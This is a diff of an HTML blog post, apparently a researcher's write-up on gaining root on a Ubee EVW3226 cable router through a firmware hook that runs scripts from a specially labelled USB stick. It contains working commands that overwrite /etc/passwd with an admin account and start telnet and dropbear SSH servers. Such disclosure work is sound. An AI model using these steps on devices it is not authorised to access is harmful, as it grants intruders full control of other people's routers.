@@ -137,7 +137,7 @@
 <p><a href="/img/ubee/execute_shell.png"><img src="/img/ubee/execute_shell_thumb.png" alt="Extract Label"></a></p>
 <p>The snippets show the relevant code sections: The binary extracts the label of an external attached USB device and if it matches <code>EVW3226</code> it executes <code>/var/tmp/mount-usb.sh</code> with <code>go</code> as a first parameter.</p>
 <p><code>mount_usb.sh</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;go&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
   dev_path<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>blkid /dev/sd |cut -c 1-9<span style="color:#66d9ef">)</span>
   eval <span style="color:#66d9ef">$(</span>blkid /dev/sd |cut -d <span style="color:#e6db74">&#34; &#34;</span> -f 2<span style="color:#66d9ef">)</span>
@@ -182,22 +182,22 @@ echo $1 ... &gt;&gt; /var/tmp/.usbadd
 <p>So by creating an USB stick with the correct label and this autorun file we are able to execute any commands we like on the router.</p>
 <p>The device is capable of running in router or in bridge mode. It looks like there is some check in place to only execute the script when running in <code>router</code> mode so be sure to switch to this mode if you want to try it on your own.</p>
 <p>So lets first prepare our USB stick:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">umount /dev/sdb1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">umount /dev/sdb1
 fdisk /dev/sdb <span style="color:#75715e"># clear partition table and create a new primary partition</span>
 mkfs.vfat /dev/sdb1
 mlabel -i /dev/sdb1 ::EVW3226
 </code></pre></div><p>Let&rsquo;s try to start a telnet server on the device by putting the following in the <code>.auto</code> file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnetd &amp;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnetd &amp;
 </code></pre></div><p>After plugging the stick in and waiting a few seconds I was able to connect via telnet. Unfortunately it seems some process is killing <code>telnetd</code> on a regular basis so it&rsquo;s no stable way to get access to the device.</p>
 <p>Luckily there is also dropbear present so we can start a ssh server. The filesystem is missing the required hostkeys so I recreated them on a Ubuntu VM on the USB stick by</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dropbearkey -t rsa -f /media/firefart/EVW3226/dropbear_rsa_host_key
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dropbearkey -t rsa -f /media/firefart/EVW3226/dropbear_rsa_host_key
 </code></pre></div><p>As I was not able to crack the password hashes in a reasonable time we also need to add our own user. I did this by just overwriting <code>/etc/passwd</code> with an <code>admin:admin</code> hash.</p>
 <p>So the final <code>.auto</code> file looks like</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span>echo admin:FvTuBQSax2MqI:0:0:admin,,,:/:/bin/sh &gt; /etc/passwd
 dropbear -r /var/tmp/disk/dropbear_rsa_host_key -p 192.168.0.1:22
 </code></pre></div><p>After plugging in the USB-Stick and waiting a few seconds we can connect to the device using ssh and login using the password <code>admin</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh admin@192.168.0.1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh admin@192.168.0.1
 </code></pre></div><p>The next steps are to peek around the device. There are already a lot of passwords and private keys lying around in the firmware image.</p>
 <p>There was also a great talk on 32C3 - <a href="https://media.ccc.de/v/32c3-7133-beyond_your_cable_modem">Beyond Your Cable Modem</a> which gives some good ideas what to check next.</p>
                     </div>
